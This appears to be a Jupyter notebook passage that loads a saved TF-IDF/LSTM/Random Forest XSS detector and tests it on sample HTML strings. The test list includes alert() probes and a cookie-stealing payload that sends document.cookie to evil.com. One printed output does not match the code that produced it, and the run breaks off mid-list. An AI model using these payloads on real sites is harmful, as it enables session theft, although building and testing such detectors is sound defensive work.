## Model Deployment - Loading and Predicting in a New Environment

### Load Models
In a new Jupyter notebook or Python environment, you would first load the saved models and preprocessors.

In [2]:
import joblib
import numpy as np
from tensorflow.keras.preprocessing.sequence import pad_sequences
from tensorflow.keras.models import load_model # For LSTM feature extractor, if needed directly

max_length = 100 # This should match the max_length used during training

# Load the models
rf_model_loaded = joblib.load("xss_rf_model.pkl")
tfidf_loaded = joblib.load("xss_tfidf_vectorizer.pkl")
tokenizer_loaded = joblib.load("xss_tokenizer.pkl")

print("Models and preprocessors loaded successfully.")

Models and preprocessors loaded successfully.


In [3]:
from tensorflow.keras.models import Sequential

lstm_model_loaded = load_model('xss_lstm_model.h5')

# Recreate the feature extractor from the loaded LSTM model
feature_extractor_loaded = Sequential(lstm_model_loaded.layers[:-1])

print("LSTM model and feature extractor loaded successfully.")

LSTM model and feature extractor loaded successfully.


In [5]:
def predict_xss(script):

    # 1. TF-IDF Feature Extraction
    tfidf_feature = tfidf_loaded.transform([script]).toarray()

    # 2. LSTM Temporal Feature Extraction
    seq = tokenizer_loaded.texts_to_sequences([script])
    pad = pad_sequences(seq, maxlen=max_length)
    lstm_feature = feature_extractor_loaded.predict(pad)

    # 3. Feature Fusion
    fusion = np.concatenate(
        [tfidf_feature, lstm_feature],
        axis=1
    )

    # 4. Random Forest Prediction
    prediction = rf_model_loaded.predict(fusion)[0]

    if prediction == 1:
        return "XSS Attack Detected"
    else:
        return "Safe Script"

# Example usage:
test_script ="""<img src=x onerror=alert(1)>"""
print(f"Script: {test_script}\nPrediction: {predict_xss(test_script)}")

test_script_safe ="""<!DOCTYPE html>
<html>
<body>
    <h3>Square Area Calculator</h3>
    <input type="number" id="side" value="5" placeholder="Enter side length">
    <button onclick="calculate()">Calculate</button>
    <p id="result"></p>

    <script>
        function calculate() {
            const side = Number(document.getElementById('side').value);
            const area = side * side;
            document.getElementById('result').textContent = `Total Area: ${area}`;
        }
    </script>
</body>
</html>
"""
print(f"\nScript: {test_script_safe}\nPrediction: {predict_xss(test_script_safe)}")

1/1 ━━━━━━━━━━━━━━━━━━━━ 0s 26ms/step
Script: <img src=x onerror=alert(1)>
Prediction: XSS Attack Detected
1/1 ━━━━━━━━━━━━━━━━━━━━ 0s 16ms/step

Script: <img src="invalid-source" onerror="alert('XSS via Image Error')">

Prediction: XSS Attack Detected


## Summary

We have successfully:
- Saved the Random Forest model, TF-IDF vectorizer, Keras Tokenizer, and the trained LSTM model.
- Demonstrated how to load these components in a new environment.
- Created a `predict_xss` function that utilizes the loaded models for real-time XSS attack detection.

## Real-Time Prediction

In [7]:

# ============================================================
# Confusing / Ambiguous Test Scripts
# These scripts mix legitimate patterns with XSS-like syntax
# ============================================================

confusing_scripts = [
    # 1. Legitimate form with inline event handler (looks like XSS but is normal)
    """<button onclick="document.getElementById('output').innerHTML = 'Hello!'">Click Me</button>""",

    # 2. Safe image with onerror for fallback (common pattern, but looks like XSS)
    """<img src="photo.jpg" onerror="this.src='fallback.png'" alt="User Photo">""",

    # 3. Legitimate script tag with DOM manipulation (normal JS but triggers XSS patterns)
    """<script>document.getElementById('name').innerHTML = user_input;</script>""",

    # 4. SVG with onload - used legitimately in animations but also in XSS
    """<svg onload="initAnimation()" width="100" height="100"><circle cx="50" cy="50" r="40"/></svg>""",

    # 5. Input field with onfocus - common in UX but used in XSS payloads
    """<input type="text" onfocus="this.placeholder=''" onblur="this.placeholder='Search...'" value="">""",

    # 6. Anchor tag with javascript: protocol (classic XSS vector but sometimes legit bookmarklet)
    """<a href="javascript:void(0)" onclick="toggleMenu()">Menu</a>""",

    # 7. Legitimate template literal that looks like injection
    """<script>const greeting = `Hello ${username}, welcome back!`; document.title = greeting;</script>""",

    # 8. Iframe with srcdoc (legitimate use but looks suspicious)
    """<iframe srcdoc="<h1>Preview</h1><p>This is a sandboxed preview</p>" sandbox></iframe>""",

    # 9. Body tag with onload - very common in normal HTML
    """<body onload="init()"><div id="app"></div></body>""",

    # 10. Encoded characters in URL (looks like obfuscated XSS but is just URL encoding)
    """<a href="https://example.com/search?q=%3Cscript%3E&page=1">Search Results</a>""",

    # 11. Data URI in image (suspicious pattern but used legitimately for small icons)
    """<img src="data:image/png;base64,iVBORw0KGgoAAAANSUhEUg==" alt="icon">""",

    # 12. Event handler in form submission (normal but has XSS-like pattern)
    """<form onsubmit="return validateForm()"><input name="email"><button type="submit">Send</button></form>""",

    # 13. XSS payload hidden inside a comment (tricky evasion technique)
    """<div>Hello World</div><!--<script>alert('xss')</script>-->""",

    # 14. Mixed - legitimate looking but actually malicious (cookie stealing)
    """<img src=x onerror="fetch('https://evil.com/steal?c='+document.cookie)">""",

    # 15. Looks safe but uses eval (dangerous pattern)
    """<script>function calc(expr) { return eval(expr); } calc(userInput);</script>""",
]

print("=" * 60)
print("CONFUSING SCRIPTS - MODEL PREDICTION RESULTS")
print("=" * 60)

for i, script in enumerate(confusing_scripts, 1):
    result = predict_xss(script)
    label = "⚠️ XSS" if "XSS" in result else "✅ SAFE"
    print(f"\n[{i:02d}] {label} | {result}")
    print(f"     Script: {script[:80]}{'...' if len(script) > 80 else ''}")

print("\n" + "=" * 60)


CONFUSING SCRIPTS - MODEL PREDICTION RESULTS
1/1 ━━━━━━━━━━━━━━━━━━━━ 0s 27ms/step

[01] ⚠️ XSS | XSS Attack Detected
     Script: <button onclick="document.getElementById('output').innerHTML = 'Hello!'">Click M...
1/1 ━━━━━━━━━━━━━━━━━━━━ 0s 18ms/step

[02] ⚠️ XSS | XSS Attack Detected
     Script: <img src="photo.jpg" onerror="this.src='fallback.png'" alt="User Photo">
1/1 ━━━━━━━━━━━━━━━━━━━━ 0s 17ms/step

[03] ⚠️ XSS | XSS Attack Detected
     Script: <script>document.getElementById('name').innerHTML = user_input;</script>
1/1 ━━━━━━━━━━━━━━━━━━━━ 0s 19ms/step

[04] ⚠️ XSS | XSS Attack Detected
     Script: <svg onload="initAnimation()" width="100" height="100"><circle cx="50" cy="50" r...
1/1 ━━━━━━━━━━━━━━━━━━━━ 0s 18ms/step

[05] ⚠️ XSS | XSS Attack Detected
     Script: <input type="text" onfocus="this.placeholder=''" onblur="this.placeholder='Searc...
1/1 ━━━━━━━━━━━━━━━━━━━━ 0s 17ms/step

[06] ✅ SAFE | Safe Script
     Script: <a href="javascript:void(0)" onclick="toggleMenu(